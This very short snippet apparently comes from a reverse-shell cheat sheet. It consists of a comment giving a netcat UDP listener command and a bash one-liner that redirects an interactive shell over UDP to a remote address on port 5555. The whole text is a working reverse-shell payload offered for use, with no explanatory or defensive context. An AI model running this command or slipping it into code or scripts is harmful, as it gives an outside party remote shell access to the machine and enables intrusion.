# listen via nc -ulvp 5555
sh -i >& /dev/udp/1.1.1.1/5555 0>&1
